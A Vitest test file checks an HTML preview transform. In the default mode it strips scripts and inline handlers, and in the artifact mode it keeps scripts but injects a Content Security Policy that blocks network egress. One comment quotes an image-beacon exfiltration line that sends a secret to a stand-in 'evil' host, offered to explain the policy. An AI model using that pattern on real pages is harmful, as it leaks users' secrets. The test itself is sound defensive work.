// @vitest-environment happy-dom
import { describe, expect, it } from 'vitest'
import { buildStaticHtmlPreview, rewriteCssUrls } from './html-preview-transform'

const resolveAsset = (baseDir: string, value: string): string =>
  `/files/asset?base=${encodeURIComponent(baseDir)}&src=${encodeURIComponent(value)}`

describe('rewriteCssUrls', () => {
  it('rewrites relative url() values and leaves remote/data URLs untouched', () => {
    expect(
      rewriteCssUrls(
        `body{background:url("./bg.png")} .x{mask:url(data:image/png;base64,abc)} .y{background:url(https://x/y.png)}`,
        '/repo/site',
        resolveAsset,
      ),
    ).toContain('/files/asset?base=%2Frepo%2Fsite&src=.%2Fbg.png')
  })
})

describe('buildStaticHtmlPreview', () => {
  it('strips scripts and inline event handlers', () => {
    const html = buildStaticHtmlPreview({
      html: '<button onclick="alert(1)">Hi</button><script>alert(2)</script>',
      fileDir: '/repo',
      resolveAsset,
      readTextAsset: () => undefined,
    })

    expect(html).toContain('<button>Hi</button>')
    expect(html).not.toContain('onclick')
    expect(html).not.toContain('<script')
  })

  it('rewrites relative image assets', () => {
    const html = buildStaticHtmlPreview({
      html: '<img src="./hero.png"><img src="https://example.com/logo.png">',
      fileDir: '/repo/docs',
      resolveAsset,
      readTextAsset: () => undefined,
    })

    const doc = new DOMParser().parseFromString(html, 'text/html')
    const images = Array.from(doc.querySelectorAll('img'))
    expect(images[0]?.getAttribute('src')).toBe('/files/asset?base=%2Frepo%2Fdocs&src=.%2Fhero.png')
    expect(images[1]?.getAttribute('src')).toBe('https://example.com/logo.png')
  })

  it('inlines a linked stylesheet when content is available and rewrites css urls relative to the css file', () => {
    const html = buildStaticHtmlPreview({
      html: '<link rel="stylesheet" href="./style/site.css"><h1>Doc</h1>',
      fileDir: '/repo/docs',
      resolveAsset,
      readTextAsset: (absPath) =>
        absPath === '/repo/docs/style/site.css'
          ? '.hero{background:url("../img/hero.png")}'
          : undefined,
    })

    expect(html).not.toContain('<link')
    expect(html).toContain('data-podium-inlined-href="./style/site.css"')
    expect(html).toContain('/files/asset?base=%2Frepo%2Fdocs%2Fstyle&src=..%2Fimg%2Fhero.png')
  })
})

/** Artifact scope ([spec:SP-0fc9]) — agent-authored prototypes are meant to be clickable,
 *  so scripts survive and the iframe grants allow-scripts. Every other scope stays static. */
describe('buildStaticHtmlPreview with allowScripts', () => {
  const build = (html: string): string =>
    buildStaticHtmlPreview({
      html,
      fileDir: '',
      resolveAsset,
      readTextAsset: () => undefined,
      allowScripts: true,
      assetOrigin: 'https://podium.example',
    })

  it('keeps scripts and inline event handlers', () => {
    const html = build('<button onclick="go()">Hi</button><script>const a = 1 < 2</script>')

    expect(html).toContain('<script>')
    expect(html).toContain('const a = 1 < 2')
    expect(html).toContain('onclick="go()"')
  })

  it('injects a CSP that blocks network egress but allows inline script and style', () => {
    const csp = cspOf(build('<p>hi</p>'))

    // The exfiltration channels: fetch/XHR/beacon, and img/media/font URLs.
    expect(csp).toContain("connect-src 'none'")
    expect(csp).toContain("default-src 'none'")
    expect(csp).toContain("form-action 'none'")
    expect(csp).toContain("base-uri 'none'")
    // Self-contained artifacts still run and render.
    expect(csp).toContain("script-src 'unsafe-inline' 'unsafe-eval'")
    expect(csp).toContain("style-src 'unsafe-inline'")
    // Subresources are pinned to the artifact's own origin — not `*`, which would
    // reopen exfiltration via `new Image().src = 'https://evil/?' + secret`.
    expect(csp).toContain('img-src https://podium.example data: blob:')
    expect(csp).not.toContain('img-src *')
  })

  it('puts the CSP first in <head> so it governs every later script', () => {
    const doc = new DOMParser().parseFromString(build('<script>1</script>'), 'text/html')
    const head = doc.querySelector('head')

    expect(head?.firstElementChild?.getAttribute('http-equiv')).toBe('Content-Security-Policy')
  })

  it('omits an empty origin rather than emitting a bare "data:" hole', () => {
    const csp = cspOf(
      buildStaticHtmlPreview({
        html: '<p>hi</p>',
        fileDir: '',
        resolveAsset,
        readTextAsset: () => undefined,
        allowScripts: true,
        assetOrigin: '',
      }),
    )

    expect(csp).toContain('img-src data: blob:')
  })

  it('still strips scripts when allowScripts is not set (every non-artifact scope)', () => {
    const html = buildStaticHtmlPreview({
      html: '<button onclick="go()">Hi</button><script>go()</script>',
      fileDir: '',
      resolveAsset,
      readTextAsset: () => undefined,
    })

    expect(html).not.toContain('<script')
    expect(html).not.toContain('onclick')
    expect(html).not.toContain('Content-Security-Policy')
  })
})

function cspOf(html: string): string {
  const doc = new DOMParser().parseFromString(html, 'text/html')
  return (
    doc.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') ?? ''
  )
}
